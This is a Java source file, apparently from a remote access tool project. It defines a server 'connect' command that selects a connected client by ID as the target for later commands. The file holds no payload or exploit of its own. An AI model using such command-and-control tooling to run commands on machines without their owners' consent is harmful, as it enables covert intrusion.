package main.java.rat.command.serverCommands;

import main.java.rat.command.IntegerCommandParameter;
import main.java.rat.command.ServerCommand;
import main.java.rat.server.connectedClients.RATConnectedClient;

public class ServerConnectCommand extends ServerCommand {

    public ServerConnectCommand() {
        parameters.add(
                new IntegerCommandParameter("clientId", true, "ID of the client to connect to")
        );
    }

    @Override
    public String getMainCommandName() {
        return "connect";
    }

    @Override
    public String getHelpText() {
        return "Make the specified client the primary client to execute commands on";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText();
    }

    @Override
    public boolean executeCommand() {
        int clientId = (int) this.getParameter("clientId").getValue();

        RATConnectedClient client = environment.getClientFromId(clientId);
        if(client == null) {
            this.error = "clientId does not exit, use 'clients' to get a list of all clients";
            return false;
        }

        environment.setConnectedClient(client);

        logger.log("Connected to "+client.getFullName());

        return true;
    }
}
